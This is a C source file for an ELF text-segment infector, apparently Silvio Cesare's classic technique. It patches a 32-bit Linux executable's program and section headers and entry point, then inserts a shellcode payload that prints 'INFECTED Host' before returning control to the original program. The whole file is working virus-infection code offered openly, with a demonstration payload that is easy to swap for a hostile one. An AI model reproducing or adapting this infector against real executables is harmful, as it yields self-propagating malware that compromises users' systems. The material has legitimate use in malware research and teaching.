/*
	This code is buggy - use at own peril.

	Silvio
*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <elf.h>

void do_insert(char *filename, int fd, char *v, int len)
{
	struct stat stat;
	char *data;
	int td;

	if (fstat(fd, &stat) < 0) {
		perror("fstat");
		exit(1);
	}

	printf("host file size: %i\n", (int)stat.st_size);

	data = (char *)malloc(stat.st_size);
	if (data == NULL) {
		perror("malloc");
		exit(1);
	}

	td = open("v.tmp", O_WRONLY | O_CREAT | O_EXCL, stat.st_mode);
	if (td < 0) {
		perror("open");
		exit(1);
	}

	if (lseek(fd, 0, SEEK_SET) < 0) {
		perror("lseek");
		exit(1);
	}

	if (read(fd, data, 400) < 0) {
		perror("read");
		exit(1);
	}

	if (write(td, data, 400) < 0) {
		perror("write");
		exit(1);
	}

	if (lseek(fd, 0, SEEK_SET) < 0) {
		perror("lseek");
		exit(1);
	}

	if (read(fd, data, stat.st_size) < 0) {
		perror("read");
		exit(1);
	}

	printf(
		"copying virus(%i) at offset %i\n",
		len, (int)lseek(td, 0, SEEK_CUR)
	);

	if (write(td, v, len) < 0) {
		perror("write");
		exit(1);
	}

	if (write(td, data, stat.st_size) < 0) {
		perror("write");
		exit(1);
	}

	if (rename("v.tmp", filename) < 0) {
		perror("rename");
		exit(1);
	}
}

void do_attach(char *filename, char *v, int len, int e)
{
	Elf32_Ehdr ehdr;
	Elf32_Shdr *shdr;
	Elf32_Phdr *phdr;
	char *data, *sdata;
	int i, move = 0, fd;

	fd = open(filename, O_RDWR);
	if (fd < 0) {
		perror("open");
		exit(1);
	}

/* read the ehdr */

	if (read(fd, &ehdr, sizeof(ehdr)) < 0) {
		perror("read");
		exit(1);
	}

/* ELF checks */

        if (
		ehdr.e_ident[0] != ELFMAG0 ||
		ehdr.e_ident[1] != ELFMAG1 ||
		ehdr.e_ident[2] != ELFMAG2 ||
		ehdr.e_ident[3] != ELFMAG3 ||
		(ehdr.e_type != ET_EXEC && ehdr.e_type != ET_DYN) ||
		(ehdr.e_machine != EM_386 && ehdr.e_machine != EM_486) ||
		ehdr.e_version != EV_CURRENT
	) {
		fprintf(stderr, "File not able to be infected (not exec).\n");
		exit(1);
	}

/* modify the virus so that it knows the correct reentry point */

	printf("host entry point: %x\n", ehdr.e_entry);
	*(int *)&v[e] = ehdr.e_entry;

/* allocate memory for phdr tables */

	data = (char *)malloc(sizeof(*phdr)*ehdr.e_phnum);
	if (data == NULL) {
		perror("malloc");
		exit(1);
	}

/* read the phdr's */

	if (lseek(fd, ehdr.e_phoff, SEEK_SET) < 0) {
		perror("lseek");
		exit(1);
	}

	if (read(fd, data, sizeof(*phdr)*ehdr.e_phnum) < 0) {
		perror("read");
		exit(1);
	}

	phdr = (Elf32_Phdr *)data;

	for (i = 0; i < ehdr.e_phnum; i++) {
		if (phdr->p_type != PT_DYNAMIC) {
			if (move) {
				phdr->p_offset += 4096;
			} else if (phdr->p_type == PT_LOAD && !phdr->p_offset){
/* is this the text segment ? */
				phdr->p_vaddr -= 4096;
				phdr->p_paddr -= 4096;
				phdr->p_filesz += 4096;
				phdr->p_memsz += 4096;

				ehdr.e_entry = phdr->p_vaddr + 400;

				printf("phdr->filesz: %i\n", phdr->p_filesz);
				printf("phdr->memsz: %i\n", phdr->p_memsz);
 
				move = 1;
			}
		}

		++phdr;
	}

/* allocated memory if required to accomodate the shdr tables */

	sdata = (char *)malloc(sizeof(*shdr)*ehdr.e_shnum);
	if (data == NULL) {
		perror("malloc");
		exit(1);
	}

/* read the shdr's */

	if (lseek(fd, ehdr.e_shoff, SEEK_SET) < 0) {
		perror("lseek");
		exit(1);
	}

	if (read(fd, sdata, sizeof(*shdr)*ehdr.e_shnum) < 0) {
		perror("read");
		exit(1);
	}

/* update the shdr's to reflect the insertion of the virus */

	shdr = (Elf32_Shdr *)sdata;

	for (i = 0; i < ehdr.e_shnum; i++) {
		shdr->sh_offset += 4096;

		++shdr;
	}

	if (lseek(fd, ehdr.e_shoff, SEEK_SET) < 0) {
		perror("lseek");
		exit(1);
	}

/* the shdr's have been updated, so write to disk */

	if (write(fd, sdata, sizeof(*shdr)*ehdr.e_shnum) < 0) {
		perror("read");
		exit(1);
	}

	free(sdata);

/*
	update the phdr's to reflect the extention of the text segment (to
	allow virus insertion)
*/


/* update the phdr's to reflect the insertion of the virus */

	if (lseek(fd, ehdr.e_phoff, SEEK_SET) < 0) {
		perror("lseek");
		exit(1);
	}

	if (write(fd, data, sizeof(*phdr)*ehdr.e_phnum) < 0) {
		perror("read");
		exit(1);
	}

	free(data);

/* update ehdr to reflect new offsets */

	ehdr.e_shoff += 4096;
	ehdr.e_phoff += 4096;

/* ehdr has been updated, write the elf header */

	if (lseek(fd, 0, SEEK_SET) < 0) {
		perror("lseek");
		exit(1);
	}

	if (write(fd, &ehdr, sizeof(ehdr)) < 0) {
		perror("write");
		exit(1);
	}

/* insert the virus */

	do_insert(filename, fd, v, len);
}

int main(int argc, char *argv[])
{
	int e = 33;
	char v[3696] =
		"\x57"			/*	pushl  %edi	*/
		"\x56"			/*	pushl  %esi	*/
		"\x50"			/*	pushl  %eax	*/
		"\x53"			/*	pushl  %ebx	*/
		"\x51"			/*	pushl  %ecx	*/
		"\x52"			/*	pushl  %edx	*/

		"\xeb\x1f"		/* jmp msg_jmp		*/
/* msg_call: */
		"\x59"			/* popl %ecx		*/
		"\xb8\x04\x00\x00\x00"	/* movl $4, %eax	*/
		"\xbb\x01\x00\x00\x00"	/* movl $1, %ebx	*/
		"\xba\x0e\x00\x00\x00"	/* movl $14,%edx	*/
		"\xcd\x80"		/* int $0x80		*/

		"\x5a"			/*	popl   %edx	*/
		"\x59"			/*	popl   %ecx	*/
		"\x5b"			/*	popl   %ebx	*/
		"\x58"			/*	popl   %eax	*/
		"\x5e"			/*	popl   %esi	*/
		"\x5f"			/*	popl   %edi	*/

                "\xbd\x00\x00\x00\x00"	/* movl $0x0, %ebp      */
                "\xff\xe5"		/* jmp *%ebp           */
/* msg_jmp: */
		"\xe8\xdc\xff\xff\xff"	/* call msg_call	*/
		"INFECTED Host\n"
	;

	if (argc != 2) {
		fprintf(stderr, "usage: infect-text-segment filename\n");
		exit(1);
	}

	do_attach(argv[1], v, sizeof(v), e);

	exit(0);
}
